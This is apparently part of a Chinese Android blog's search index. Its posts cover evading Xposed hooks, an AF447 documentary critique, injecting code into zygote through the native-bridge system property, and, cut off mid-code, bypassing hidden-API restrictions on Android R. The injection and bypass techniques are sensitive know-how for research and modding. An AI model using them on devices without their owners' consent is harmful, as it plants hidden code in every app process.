HookXposedDetector的做法是，通过上面的方法，可以找到当前进程里的所有类，依据此法找到 XposedBridge 把 disableHooks 和 sHookedMethodCallbacks 改掉就可以。实际上，还有很多其他方法：除了原版xposed和0.5之前的edxposed，其他框架基本都直接忽略隔离进程，可以把重要的东西放在隔离进程。通过 Xposed hook 一个方法，最终都会走到这个方法：123456public static XC_MethodHook.Unhook hookMethod(Member hookMethod, XC_MethodHook callback) &#123; // ... else if (hookMethod.getDeclaringClass().isInterface()) &#123; throw new IllegalArgumentException(\"Cannot hook interfaces: \" + hookMethod.toString()); &#125;&#125;这段检查在Android 7之后是有问题的，因为Android 7支持了一个Java 8特性，叫做interface default method。interface不再只能“说空话”，而也能有自己的方法体，而实现类只要不重写，该方法的declaring class就是interface，Xposed进行hook时就会抛出异常。Xposed和各路实现基本原理都是对entry_point_from_quick_compiled_code_这个成员动手脚，可以直接修改这个成员也可以inline hook；而在art中有一个“万能入口”：解释执行入口，通过设置方法入口为解释执行可以使得 Xposed hook 失效，但对 Frida 这种修改了解释器的无效。","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"magisk","slug":"magisk","permalink":"https://blog.canyie.top/tags/magisk/"},{"name":"xposed","slug":"xposed","permalink":"https://blog.canyie.top/tags/xposed/"}]},{"title":"《空中浩劫》里的法航447","slug":"af447-in-aci","date":"2020-08-20T03:08:17.000Z","updated":"2025-04-24T10:33:02.812Z","comments":true,"path":"2020/08/20/af447-in-aci/","link":"","permalink":"https://blog.canyie.top/2020/08/20/af447-in-aci/","excerpt":"2009年6月1日（UTC时间），法国航空447号班机（机型空中客车A330-203、注册号F-GZCP）在大西洋中部雷达盲区神秘失踪，后被证实坠毁，机上228人（乘客216人、机组成员12人）全数罹难。著名空难文献剧《Air Crash Investigation》（中文一般译为《空中浩劫》，以下简称ACI）在S12E13中收录了此事故，揭露了所谓的“空难真相”，将矛头直指副驾驶皮埃尔-塞德里克·博南（Pierre Cédric Bonin）；同时，由于该片的知名度，让许多航空爱好者乃至真正的航空从业者认为该片所述即为事实。然而，真的是这样吗？","text":"2009年6月1日（UTC时间），法国航空447号班机（机型空中客车A330-203、注册号F-GZCP）在大西洋中部雷达盲区神秘失踪，后被证实坠毁，机上228人（乘客216人、机组成员12人）全数罹难。著名空难文献剧《Air Crash Investigation》（中文一般译为《空中浩劫》，以下简称ACI）在S12E13中收录了此事故，揭露了所谓的“空难真相”，将矛头直指副驾驶皮埃尔-塞德里克·博南（Pierre Cédric Bonin）；同时，由于该片的知名度，让许多航空爱好者乃至真正的航空从业者认为该片所述即为事实。然而，真的是这样吗？（注：本文主要内容将对比《空中浩劫》中所述与事实进行对比，不继续深入探讨飞机失事的深层原因；本文内容基于官方调查报告及官方黑匣子数据；如无特别说明，本文所有时间都采用UTC时间）。在空难发生前几分钟，冰晶堵塞了皮托管，导致空速读数不一致，飞机的自动驾驶仪立刻断开，同时保护法则切换至备用。此时博南接手控制并开始拉杆。接下来，该片中表示“即使另一名飞行员罗伯特告诉博南需要推杆，博南仍然一直在拉杆”；然而，FDR数据显示博南听从了罗伯特的建议，开始推杆(模拟动画中可以很明显看见右座侧杆在“nose down”位）。同时，ECAM上显示了最大速度，调查报告中表示这可能使机组更担心飞机超速而非失速，然而该细节没有展示在该片中。接下来博南因为对当前情况的困惑再次开始拉杆。此时，飞机陷入失速开始坠落，该片中表示“罗伯特接手控制，他开始推杆以改出失速，但博南仍在拉杆，他们的输入完全相反导致互相抵消了”；而现实是，罗伯特的确尝试接手，但是他只是向左扳了两下侧杆，然后控制权就又被博南抢走了。调查报告原文如下：At 2 h 11 min 37, the PNF said “controls to the left”, took over priority without any callout and continued to handle the aeroplane. The PF almost immediately took back priority without any callout and continued piloting.此时，由于空速过低（三根皮托管测出的空速数据都小于60 kt），飞机认为这是电脑出了故障而抑制了失速警告，随后飞行员曾多次尝试推杆降低攻角，这使得空速回升，虽然还是失速但电脑认为这个值是有效的，再次触发了失速警告，这使得飞行员更加困惑；而如此重要的信息ACI里竟然一句都没提。调查报告原文：At around 2 h 11 min 42, the Captain re-entered the cockpit. During the following seconds, all of the recorded speeds became invalid and the stall warning stopped, after having sounded continuously for 54 seconds.At 2 h 12 min 02, the PF said, “I have no more displays”, and the PNF “we have no valid indications”. At that moment, the thrust levers were in the IDLE detent and the engines’ N1’s were at 55%. Around fifteen seconds later, the PF made pitch-down inputs. In the following moments, the angle of attack decreased, the speeds became valid again and the stall warning triggered again.If the CAS measurements for the three ADR are lower than 60 kt, the angle of attack values of the three ADR are invalid and the stall warning is then inoperative. This results from a logic stating that the airflow must be sufficient to ensure a valid measurement by the angle of attack sensors, especially to prevent spurious warnings.在这种情况下，飞行员不会相信失速警告因为它表现得和以前他们所学到的内容完全相反；飞行员会本能地拉着杆让失速警告停止，殊不知这样会让情况更加恶化。飞机就这样因为失速不断下坠，到了8000 ft，这个时候才发生明确的俯仰指令冲突，且FDR数据中有非常明确的“DUAL INPUT”警告，随后博南立刻放开了手，并非该片中所说的“两位飞行员输入相反，导致在没有警告的情况下相互抵消”；随后两位飞行员都开始拉杆；此时高度过低已无力回天，飞机坠入了冰冷的大西洋，机上228人全部罹难，R.I.P.另附一些有趣的细节：对其他机组进行类似状况模拟，有多个机组未能正确认识当前状态（见调查报告 1.16.2 及 1.16.8.4）。残骸表明左座位在空难发生时在收回位（见调查报告 1.16.9）。2006年5月3日，亚美尼亚航空967号班机在索契国际机场附近坠海，最终调查报告中提到在飞行的最后时刻，两位飞行员对侧杆做出了相反的输入，且“DUAL INPUT”警告因为优先级低于近地警告而被抑制。法航A330“空速不可靠”操作手册：至此，相信大家都了解了某文献剧是什么样的。另附营销号笑话一则（纯娱乐，无恶意）：飞机是怎么飞起来的呢？飞机相信大家都很熟悉，但是飞机是怎么飞起来的呢，下面就让小编带大家一起了解吧。飞机能飞起来，其实靠的就是引擎，而引擎是怎么工作的呢，其实和我们小时候玩的摇摇车是一样原理，投币就能工作，大家可能会很惊讶飞机怎么会靠引擎飞起来呢？但事实就是这样，小编也感到非常惊讶。这就是关于飞机能飞起来的事情了，大家有什么想法呢，欢迎在评论区告诉小编一起讨论哦！外部引用：BEA发布的法航447空难最终调查报告（英文版）BEA发布的法航447 FDR动画（中文翻译版）《空中浩劫》S12E13：法国航空447号班机","categories":[],"tags":[{"name":"航空","slug":"航空","permalink":"https://blog.canyie.top/tags/%E8%88%AA%E7%A9%BA/"}]},{"title":"通过系统的native bridge实现注入zygote","slug":"nbinjection","date":"2020-08-18T12:17:23.000Z","updated":"2025-04-24T10:33:02.823Z","comments":true,"path":"2020/08/18/nbinjection/","link":"","permalink":"https://blog.canyie.top/2020/08/18/nbinjection/","excerpt":"之前研究art的时候发现了native bridge，简单来说这东西是主要作用就是为了能运行不同指令集的so（比如x86的设备运行arm的app），而arm设备上这个东西一般都是关闭的，研究了一下后发现这东西挺适合动手脚的，刚好自己在用的Riru被针对了，所以有了这篇博客。把对应的示例代码传到了github：NbInjection，接下来我们聊一下这个小玩具。","text":"之前研究art的时候发现了native bridge，简单来说这东西是主要作用就是为了能运行不同指令集的so（比如x86的设备运行arm的app），而arm设备上这个东西一般都是关闭的，研究了一下后发现这东西挺适合动手脚的，刚好自己在用的Riru被针对了，所以有了这篇博客。把对应的示例代码传到了github：NbInjection，接下来我们聊一下这个小玩具。源码分析大家都知道的，zygote对应的可执行文件就是app_process，它的main函数代码如下（已精简）：123456789101112131415161718int main(int argc, char* const argv[])&#123; AppRuntime runtime(argv[0], computeArgBlockSize(argc, argv)); // Process command line arguments // ignore argv[0] argc--; argv++; if (zygote) &#123; runtime.start(\"com.android.internal.os.ZygoteInit\", args, zygote); &#125; else if (className) &#123; runtime.start(\"com.android.internal.os.RuntimeInit\", args, zygote); &#125; else &#123; fprintf(stderr, \"Error: no class name or --zygote supplied.\\n\"); app_usage(); LOG_ALWAYS_FATAL(\"app_process: no class name or --zygote supplied.\"); &#125;&#125;AppRuntime继承自AndroidRuntime，而AndroidRuntime的代码大概是这样的：1234567891011121314151617181920212223242526272829303132/* * Start the Android runtime. This involves starting the virtual machine * and calling the \"static void main(String[] args)\" method in the class * named by \"className\". * * Passes the main function two arguments, the class name and the specified * options string. */void AndroidRuntime::start(const char* className, const Vector&lt;String8&gt;&amp; options, bool zygote)&#123; ALOGD(\"&gt;&gt;&gt;&gt;&gt;&gt; START %s uid %d &lt;&lt;&lt;&lt;&lt;&lt;\\n\", className != NULL ? className : \"(unknown)\", getuid()); /* start the virtual machine */ JniInvocation jni_invocation; jni_invocation.Init(NULL); JNIEnv* env; if (startVm(&amp;mJavaVM, &amp;env, zygote, primary_zygote) != 0) &#123; return; &#125; onVmCreated(env); /* * Register android functions. */ if (startReg(env) &lt; 0) &#123; ALOGE(\"Unable to register all android natives\\n\"); return; &#125; // ...&#125;这个函数做的最重要一件事就是把虚拟机启动起来（startVm），然后调用传入类的main方法。追踪这个startVm方法你会发现调用到了Runtime::Init初始化runtime，这个函数很长，截取了一段对我们来说最重要的：1234567891011121314151617181920212223242526272829303132333435bool Runtime::Init(RuntimeArgumentMap&amp;&amp; runtime_options_in) &#123; // ... // Look for a native bridge. // // The intended flow here is, in the case of a running system: // // Runtime::Init() (zygote): // LoadNativeBridge -&gt; dlopen from cmd line parameter. // | // V // Runtime::Start() (zygote): // No-op wrt native bridge. // | // | start app // V // DidForkFromZygote(action) // action = kUnload -&gt; dlclose native bridge. // action = kInitialize -&gt; initialize library // // // The intended flow here is, in the case of a simple dalvikvm call: // // Runtime::Init(): // LoadNativeBridge -&gt; dlopen from cmd line parameter. // | // V // Runtime::Start(): // DidForkFromZygote(kInitialize) -&gt; try to initialize any native bridge given. // No-op wrt native bridge. &#123; std::string native_bridge_file_name = runtime_options.ReleaseOrDefault(Opt::NativeBridge); is_native_bridge_loaded_ = LoadNativeBridge(native_bridge_file_name); &#125; // ...&#125;在Runtime::Init里会加载native bridge，LoadNativeBridge()函数是这样实现的：12345678910111213141516171819202122232425262728293031323334353637383940414243bool LoadNativeBridge(const char* nb_library_filename, const NativeBridgeRuntimeCallbacks* runtime_cbs) &#123; // We expect only one place that calls LoadNativeBridge: Runtime::Init. At that point we are not // multi-threaded, so we do not need locking here. if (nb_library_filename == nullptr || *nb_library_filename == 0) &#123; CloseNativeBridge(false); return false; &#125; else &#123; if (!NativeBridgeNameAcceptable(nb_library_filename)) &#123; CloseNativeBridge(true); &#125; else &#123; // Try to open the library. void* handle = dlopen(nb_library_filename, RTLD_LAZY); if (handle != nullptr) &#123; callbacks = reinterpret_cast&lt;NativeBridgeCallbacks*&gt;(dlsym(handle, kNativeBridgeInterfaceSymbol)); if (callbacks != nullptr) &#123; if (isCompatibleWith(NAMESPACE_VERSION)) &#123; // Store the handle for later. native_bridge_handle = handle; &#125; else &#123; callbacks = nullptr; dlclose(handle); ALOGW(\"Unsupported native bridge interface.\"); &#125; &#125; else &#123; dlclose(handle); &#125; &#125; // Two failure conditions: could not find library (dlopen failed), or could not find native // bridge interface (dlsym failed). Both are an error and close the native bridge. if (callbacks == nullptr) &#123; CloseNativeBridge(true); &#125; else &#123; runtime_callbacks = runtime_cbs; state = NativeBridgeState::kOpened; &#125; &#125; return state == NativeBridgeState::kOpened; &#125;&#125;发现了什么没有！！是我们熟悉的dlopen！！dlopen会执行目标库的.init_array中的所有函数，而让自己的函数进入.init_array实际上只需要声明__attribute__((constructor))就好了，完全没有难度啊！hey，先冷静一下，我们还有一个问题不知道答案：这个native bridge是从哪传进来的？答案很简单，回过头看一下AndroidRuntime::startVm()就明白了：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/* * Start the Dalvik Virtual Machine. * * Various arguments, most determined by system properties, are passed in. * The \"mOptions\" vector is updated. * * CAUTION: when adding options in here, be careful not to put the * char buffer inside a nested scope. Adding the buffer to the * options using mOptions.add() does not copy the buffer, so if the * buffer goes out of scope the option may be overwritten. It's best * to put the buffer at the top of the function so that it is more * unlikely that someone will surround it in a scope at a later time * and thus introduce a bug. * * Returns 0 on success. */int AndroidRuntime::startVm(JavaVM** pJavaVM, JNIEnv** pEnv, bool zygote, bool primary_zygote)&#123; JavaVMInitArgs initArgs; // ... // Native bridge library. \"0\" means that native bridge is disabled. // // Note: bridging is only enabled for the zygote. Other runs of // app_process may not have the permissions to mount etc. property_get(\"ro.dalvik.vm.native.bridge\", propBuf, \"\"); if (propBuf[0] == '\\0') &#123; ALOGW(\"ro.dalvik.vm.native.bridge is not expected to be empty\"); &#125; else if (zygote &amp;&amp; strcmp(propBuf, \"0\") != 0) &#123; snprintf(nativeBridgeLibrary, sizeof(\"-XX:NativeBridge=\") + PROPERTY_VALUE_MAX, \"-XX:NativeBridge=%s\", propBuf); addOption(nativeBridgeLibrary); &#125; // ... initArgs.version = JNI_VERSION_1_4; initArgs.options = mOptions.editArray(); initArgs.nOptions = mOptions.size(); initArgs.ignoreUnrecognized = JNI_FALSE; /* * Initialize the VM. * * The JavaVM* is essentially per-process, and the JNIEnv* is per-thread. * If this call succeeds, the VM is ready, and we can start issuing * JNI calls. */ if (JNI_CreateJavaVM(pJavaVM, pEnv, &amp;initArgs) &lt; 0) &#123; ALOGE(\"JNI_CreateJavaVM failed\\n\"); return -1; &#125; return 0;&#125;原来是读取的ro.dalvik.vm.native.bridge这个系统属性啊，等等，这个属性名字是以.ro开头的，也就代表着这个属性是只读的，一旦设置不能修改…… 另一个问题是，这个属性定义在default.prop中，而非常规的build.prop，这个文件改不了，每次开机都会重新读取，那还玩啥啊，拜拜……等等！谁说这条属性就只能由厂商修改了？利用我拿来测试的设备是一台Google Pixel 3（Android 10，Magisk 20.4），因为有magisk所以直接写成了magisk模块；没有magisk的话可以考虑修改ramdisk.img（此方法同样适用于模拟器），将default.prop中的ro.dalvik.vm.native.bridge修改为我们的so文件名就好了（注意文件必须在系统的lib下面）这里就当你把环境配置好了吧，让我们继续：写一个函数，往里面写入代码，加上__attribute__((constructor))，编译，放/system/lib64和/system/lib下面，修改ro.dalvik.vm.native.bridge为我们的文件名，重启，成功，完结撒花……当然不可能这么容易，此时虽然你已经把代码成功注入到了zygote进程，但是还有一些问题要处理，让我们来细数一下。系统原有的native bridge被覆盖native bridge这东西对arm设备上来说基本没啥用，然而对x86设备来说，没有这玩意你就没法用只支持arm的app，也就是说你连微信都用不了……要解决这个问题，还是得看源码，看看系统是怎么调用的native bridge里的函数：1234567void* NativeBridgeGetTrampoline(void* handle, const char* name, const char* shorty, uint32_t len) &#123; if (NativeBridgeInitialized()) &#123; return callbacks-&gt;getTrampoline(handle, name, shorty, len); &#125; return nullptr;&#125;是用的一个叫callbacks的全局变量啊，看下这个callbacks是啥：1234567891011121314151617// Native bridge interfaces to runtime.struct NativeBridgeCallbacks &#123; // Version number of the interface. uint32_t version; bool (*initialize)(const struct NativeBridgeRuntimeCallbacks* runtime_cbs, const char* private_dir, const char* instruction_set); void* (*loadLibrary)(const char* libpath, int flag); void* (*getTrampoline)(void* handle, const char* name, const char* shorty, uint32_t len); // ...&#125;// Pointer to the callbacks. Available as soon as LoadNativeBridge succeeds, but only initialized// later.static const NativeBridgeCallbacks* callbacks = nullptr;原来是一个指向NativeBridgeCallbacks的指针，这个叫做NativeBridgeCallbacks的结构体里包含函数指针，运行时会找到对应的函数指针然后调用。这个变量是在哪初始化的呢：1234567891011121314151617181920212223242526// The symbol name exposed by native-bridge with the type of NativeBridgeCallbacks.static constexpr const char* kNativeBridgeInterfaceSymbol = \"NativeBridgeItf\";bool LoadNativeBridge(const char* nb_library_filename, const NativeBridgeRuntimeCallbacks* runtime_cbs) &#123; // Try to open the library. void* handle = dlopen(nb_library_filename, RTLD_LAZY); if (handle != nullptr) &#123; callbacks = reinterpret_cast&lt;NativeBridgeCallbacks*&gt;(dlsym(handle, kNativeBridgeInterfaceSymbol)); if (callbacks != nullptr) &#123; if (isCompatibleWith(NAMESPACE_VERSION)) &#123; // Store the handle for later. native_bridge_handle = handle; &#125; else &#123; callbacks = nullptr; dlclose(handle); ALOGW(\"Unsupported native bridge interface.\"); &#125; &#125; else &#123; dlclose(handle); &#125; &#125; return state == NativeBridgeState::kOpened; &#125;&#125;是从native bridge的so库中找到的，对应符号是NativeBridgeItf。既然系统是这样做的，那我们就顺着系统来，在合适的时候偷梁换柱一下。首先声明一个对应类型的变量NativeBridgeItf：1__attribute__ ((visibility (\"default\"))) NativeBridgeCallbacks NativeBridgeItf;注：如果你使用c++，记得加上extern &quot;C&quot;。然后，在系统dlopen我们的库时，会执行.init_array里的函数，我们可以在这里动手脚：1234567891011121314151617181920if (real_nb_filename[0] == '\\0') &#123; LOGW(\"ro.dalvik.vm.native.bridge is not expected to be empty\");&#125; else if (strcmp(real_nb_filename, \"0\") != 0) &#123; LOGI(\"The system has real native bridge support, libname %s\", real_nb_filename); const char* error_msg; void* handle = dlopen(real_nb_filename, RTLD_LAZY); if (handle) &#123; void* real_nb_itf = dlsym(handle, \"NativeBridgeItf\"); if (real_nb_itf) &#123; // sizeof(NativeBridgeCallbacks) maybe changed in other android version memcpy(&amp;NativeBridgeItf, real_nb_itf, sizeof(NativeBridgeCallbacks)); return; &#125; errro_msg = dlerror(); dlclose(handle); &#125; else &#123; errro_msg = dlerror(); &#125; LOGE(\"Could not setup NativeBridgeItf for real lib %s: %s\", real_nb_filename, error_msg);&#125;简单解释一下：系统是通过读取我们的NativeBridgeItf这个变量来获取要执行的对应函数的，那我们就可以仿照系统，从真正的native bridge中读取这个变量，覆盖掉我们暴露出去的那个NativeBridgeItf，这样就会走真实的native bridge callbacks。注：这里还有个坑，NativeBridgeCallbacks这个结构体的大小在其他系统版本是不同的，如果只复制固定大小，要么复制不全要么越界；所以这里需要按照版本判断一下。无法驻留在内存中当你兴致勃勃地写好了代码，运行时你会发现各种奇怪的bug，排查N遍后你才发现，你写好的这个so在内存中不知道什么时候消失了？？让我们看看系统的那个LoadNativeBridge：12345678910111213141516void* handle = dlopen(nb_library_filename, RTLD_LAZY);if (handle != nullptr) &#123; callbacks = reinterpret_cast&lt;NativeBridgeCallbacks*&gt;(dlsym(handle, kNativeBridgeInterfaceSymbol)); if (callbacks != nullptr) &#123; if (isCompatibleWith(NAMESPACE_VERSION)) &#123; // Store the handle for later. native_bridge_handle = handle; &#125; else &#123; callbacks = nullptr; dlclose(handle); ALOGW(\"Unsupported native bridge interface.\"); &#125; &#125; else &#123; dlclose(handle); &#125;&#125;如果isCompatibleWith这个函数返回false，那么就会close掉我们的so库。12345678910111213141516// The policy of invoking Nativebridge changed in v3 with/without namespace.// Suggest Nativebridge implementation not maintain backward-compatible.static bool isCompatibleWith(const uint32_t version) &#123; // Libnativebridge is now designed to be forward-compatible. So only \"0\" is an unsupported // version. if (callbacks == nullptr || callbacks-&gt;version == 0 || version == 0) &#123; return false; &#125; // If this is a v2+ bridge, it may not be forwards- or backwards-compatible. Check. if (callbacks-&gt;version &gt;= SIGNAL_VERSION) &#123; return callbacks-&gt;isCompatibleWith(version); &#125; return true;&#125;是通过callbacks-&gt;version和callbacks-&gt;isCompatibleWith这个函数指针判断的。那我们需要在系统没有native bridge时设置一下这些东西。（如果系统有native bridge那么在上面NativeBridgeItf就已经被覆盖了）你需要把callbacks里面的东西都设置一下，以免发生其他问题；还好还好，那些函数只需要写个空实现就行，需要注意的是版本，比如5.0就只接受v1版本的native bridge，而7.0时只接受v3及以上版本。把这些设置好了以后，你的so库能成功驻留在zygote进程的内存中了；然而，你在应用进程中找不到这个so库，这是因为新进程fork出来以后，如果不需要native bridge，系统会卸载它：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950static void ZygoteHooks_nativePostForkChild(JNIEnv* env, jclass, jlong token, jint runtime_flags, jboolean is_system_server, jboolean is_zygote, jstring instruction_set) &#123; // ... if (instruction_set != nullptr &amp;&amp; !is_system_server) &#123; ScopedUtfChars isa_string(env, instruction_set); InstructionSet isa = GetInstructionSetFromString(isa_string.c_str()); Runtime::NativeBridgeAction action = Runtime::NativeBridgeAction::kUnload; if (isa != InstructionSet::kNone &amp;&amp; isa != kRuntimeISA) &#123; action = Runtime::NativeBridgeAction::kInitialize; &#125; runtime-&gt;InitNonZygoteOrPostFork(env, is_system_server, is_zygote, action, isa_string.c_str()); &#125; else &#123; runtime-&gt;InitNonZygoteOrPostFork( env, is_system_server, is_zygote, Runtime::NativeBridgeAction::kUnload, /*isa=*/ nullptr, profile_system_server); &#125;&#125;void Runtime::InitNonZygoteOrPostFork( JNIEnv* env, bool is_system_server, // This is true when we are initializing a child-zygote. It requires // native bridge initialization to be able to run guest native code in // doPreload(). bool is_child_zygote, NativeBridgeAction action, const char* isa, bool profile_system_server) &#123; if (is_native_bridge_loaded_) &#123; switch (action) &#123; case NativeBridgeAction::kUnload: UnloadNativeBridge(); is_native_bridge_loaded_ = false; break; case NativeBridgeAction::kInitialize: InitializeNativeBridge(env, isa); break; &#125; &#125; // ...&#125;这个过程我们很难干预，然而其实我们可以换个思路：既然系统要卸载这个so库，那我们就让它卸载；我们已经可以在zygote里执行任意代码了，那么写个新so库把主要逻辑放里面，在这个假的native bridge里dlopen()这个新库，假的native bridge直接当个loader不就好了嘛！而且这样的话实际上我们不用实现那堆函数，只需要把version设置成一个无效的值（比如0），这样系统检测到版本无效就会自动关闭我们的假native bridge库，也不用担心那些回调函数会被调用~总结利用native bridge可以实现比较简单的zygote注入，实际用起来需要费点功夫，不过都是体力活，比如每个版本中NativeBridgeCallbacks这个结构体的大小之类的；以后可能会把这东西应用在我的Dreamland上。文末再放一下示例代码链接：NbInjectionQQ群：949888394，欢迎一起来玩~文章可能有疏漏，也可能有更好的办法；欢迎交流讨论~","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"art","slug":"art","permalink":"https://blog.canyie.top/tags/art/"},{"name":"注入","slug":"注入","permalink":"https://blog.canyie.top/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"Android R上的隐藏API限制学习笔记","slug":"hiddenapi-restriction-policy-on-android-r","date":"2020-06-10T02:00:00.000Z","updated":"2025-04-24T10:33:02.823Z","comments":true,"path":"2020/06/10/hiddenapi-restriction-policy-on-android-r/","link":"","permalink":"https://blog.canyie.top/2020/06/10/hiddenapi-restriction-policy-on-android-r/","excerpt":"2018年发布的Android 9中引入了对隐藏API的限制，这对整个Android生态来说当然是一件好事，但也严重限制了以往我们通过反射等手段实现的“黑科技”（如插件化等），所以开发者们纷纷寻找手段绕过这个限制，比如我曾经提出了两个绕过方法，其中一个便是几乎完美的双重反射（即“元反射”，现在来看叫“套娃反射”比较好）；而在即将发布的Android R中把这个方法封杀了（谷歌：禁止套娃！），因此我重新研究了Android R中的限制策略。","text":"2018年发布的Android 9中引入了对隐藏API的限制，这对整个Android生态来说当然是一件好事，但也严重限制了以往我们通过反射等手段实现的“黑科技”（如插件化等），所以开发者们纷纷寻找手段绕过这个限制，比如我曾经提出了两个绕过方法，其中一个便是几乎完美的双重反射（即“元反射”，现在来看叫“套娃反射”比较好）；而在即将发布的Android R中把这个方法封杀了（谷歌：禁止套娃！），因此我重新研究了Android R中的限制策略。2021/4/10 更新：本文存在纰漏，请看一个通用的纯 Java 安卓隐藏 API 限制绕过方案上有政策常言道，知己知彼，百战百胜。要想破解这个限制，就必须去搞懂系统是怎么施加的限制；ok，废话不多说，let’s go！以我们在Java层通过反射获取一个Method为例，Class.getMethod/getDeclaredMethod最终都会进入一个native方法getDeclaredMethodInternal，这个方法的实现如下：1234567891011121314static jobject Class_getDeclaredMethodInternal(JNIEnv* env, jobject javaThis, jstring name, jobjectArray args) &#123; // 省略无关代码…… Handle&lt;mirror::Method&gt; result = hs.NewHandle( mirror::Class::GetDeclaredMethodInternal&lt;kRuntimePointerSize&gt;( soa.Self(), klass, soa.Decode&lt;mirror::String&gt;(name), soa.Decode&lt;mirror::ObjectArray&lt;mirror::Class&gt;&gt;(args), GetHiddenapiAccessContextFunction(soa.Self()))); if (result == nullptr || ShouldDenyAccessToMember(result-&gt;GetArtMethod(), soa.Self())) &#123; return nullptr; &#125; return soa.AddLocalReference&lt;jobject&gt;(result.Get());&#125;我们可以发现，如果ShouldDenyAccessToMember返回true，那么就会返回null，上层就会抛出方法找不到的异常。这里和Android P没什么不同，只是把ShouldBlockAccessToMember改了个名而已。ShouldDenyAccessToMember会调用到hiddenapi::ShouldDenyAccessToMember，该函数是这样实现的：123456789101112131415161718192021222324252627282930313233343536373839template&lt;typename T&gt;inline bool ShouldDenyAccessToMember(T* member, const std::function&lt;AccessContext()&gt;&amp; fn_get_access_context, AccessMethod access_method) REQUIRES_SHARED(Locks::mutator_lock_) &#123; const uint32_t runtime_flags = GetRuntimeFlags(member); // 1：如果该成员是公开API，直接通过 if ((runtime_flags &amp; kAccPublicApi) != 0) &#123; return false; &#125; // 2：不是公开API（即为隐藏API），获取调用者和被访问成员的Domain // 因为获取调用者需要回溯调用栈，性能非常差，所以尽量避免这个消耗 const AccessContext caller_context = fn_get_access_context(); const AccessContext callee_context(member-&gt;GetDeclaringClass()); // 3：如果调用者是可信的，直接返回 if (caller_context.CanAlwaysAccess(callee_context)) &#123; return false; &#125; // 4：非可信调用者尝试访问隐藏API，根据调用者的Domain决定行为 switch (caller_context.GetDomain()) &#123; case Domain::kApplication: &#123; DCHECK(!callee_context.IsApplicationDomain()); // 如果访问检查被完全禁用，那么直接返回 EnforcementPolicy policy = Runtime::Current()-&gt;GetHiddenApiEnforcementPolicy(); if (policy == EnforcementPolicy::kDisabled) &#123; return false; &#125; // 5：调用detail::ShouldDenyAccessToMemberImpl，决定是否需要拒绝访问 return detail::ShouldDenyAccessToMemberImpl(member, api_list, access_method); &#125; // 省略 &#125;这个函数还是比较长的，我们一步步分析。判断目标成员是否是公开API，如果是那么直接通过，具体可以看见是通过GetRuntimeFlags获取，这个flags其实是储存在该成员的access_flags_中（其实这里不太完全，暂且这么认为吧）获取调用者的Domain，判断是否可信，如果可信直接通过以上条件都不满足，根据Domain走不同的实现，我们应用的代码对应的Domain是kApplication，主要看第一个case就行。第二步中获取调用者的函数中核心部分如下：1234567891011121314151617181920212223242526272829303132333435363738bool VisitFrame() override REQUIRES_SHARED(Locks::mutator_lock_) &#123; ArtMethod *m = GetMethod(); if (m == nullptr) &#123; // Attached native thread. Assume this is *not* boot class path. caller = nullptr; return false; &#125; else if (m-&gt;IsRuntimeMethod()) &#123; // 跳过 ART Runtime 内部方法 return true; &#125; ObjPtr&lt;mirror::Class&gt; declaring_class = m-&gt;GetDeclaringClass(); if (declaring_class-&gt;IsBootStrapClassLoaded()) &#123; // 跳过 java.lang.Class 中的内部方法 if (declaring_class-&gt;IsClassClass()) &#123; return true; &#125; // 跳过 java.lang.invoke.* ObjPtr&lt;mirror::Class&gt; lookup_class = GetClassRoot&lt;mirror::MethodHandlesLookup&gt;(); if ((declaring_class == lookup_class || declaring_class-&gt;IsInSamePackage(lookup_class)) &amp;&amp; !m-&gt;IsClassInitializer()) &#123; return true; &#125; // 如果PREVENT_META_REFLECTION_BLACKLIST_ACCESS为Enabled，跳过来自 java.lang.reflect.* 的访问 // 系统对“套娃反射”的限制的关键就在此 ObjPtr&lt;mirror::Class&gt; proxy_class = GetClassRoot&lt;mirror::Proxy&gt;(); if (declaring_class-&gt;IsInSamePackage(proxy_class) &amp;&amp; declaring_class != proxy_class) &#123; if (Runtime::Current()-&gt;isChangeEnabled(kPreventMetaReflectionBlacklistAccess)) &#123; return true; &#125; &#125; &#125; caller = m; return false;&#125;根据caller选择Domain：123456789101112131415161718192021static Domain ComputeDomain(ObjPtr&lt;mirror::ClassLoader&gt; class_loader, const DexFile* dex_file) &#123; if (dex_file == nullptr) &#123; // dex_file == nullptr &amp;&amp; class_loader == nullptr（即被BootClassLoader加载的类），那么可信 return ComputeDomain(/* is_trusted= */ class_loader.IsNull()); &#125; // 获取dex_file的Domain return dex_file-&gt;GetHiddenapiDomain();&#125;static Domain ComputeDomain(ObjPtr&lt;mirror::Class&gt; klass, const DexFile* dex_file) REQUIRES_SHARED(Locks::mutator_lock_) &#123; Domain domain = ComputeDomain(klass-&gt;GetClassLoader(), dex_file); if (domain == Domain::kApplication &amp;&amp; klass-&gt;ShouldSkipHiddenApiChecks() &amp;&amp; Runtime::Current()-&gt;IsJavaDebuggable()) &#123; // debug mode下开发者可以主动指定某类可信，用于调试 domain = ComputeDomain(/* is_trusted= */ true); &#125; return domain;&#125;dex_file的Domain在第一次加载Class时被初始化（注：Android 8时就已经不允许一个DexFile同时加载多个ClassLoader了）：1234567891011121314151617181920212223242526272829303132333435static Domain DetermineDomainFromLocation(const std::string&amp; dex_location, ObjPtr&lt;mirror::ClassLoader&gt; class_loader) &#123; if (ArtModuleRootDistinctFromAndroidRoot()) &#123; // 在几个核心apex module内 if (LocationIsOnArtModule(dex_location.c_str()) || LocationIsOnConscryptModule(dex_location.c_str()) || LocationIsOnI18nModule(dex_location.c_str())) &#123; return Domain::kCorePlatform; &#125; // 在apex下但是不是核心module if (LocationIsOnApex(dex_location.c_str())) &#123; return Domain::kPlatform; &#125; &#125; // 在/system/framework/下 if (LocationIsOnSystemFramework(dex_location.c_str())) &#123; return Domain::kPlatform; &#125; // 在/system/ext/framework/下 if (LocationIsOnSystemExtFramework(dex_location.c_str())) &#123; return Domain::kPlatform; &#125; // ClassLoader是null（即BootClassLoader） if (class_loader.IsNull()) &#123; LOG(WARNING) &lt;&lt; \"DexFile \" &lt;&lt; dex_location &lt;&lt; \" is in boot class path but is not in a known location\"; return Domain::kPlatform; &#125; return Domain::kApplication;&#125;值得注意的是Android Q中细分出了三个Domain：kCorePlatform、kPlatform、kApplication，同时对kPlatform访问kCorePlatform的情况也做出了一定限制：1234567891011121314151617case 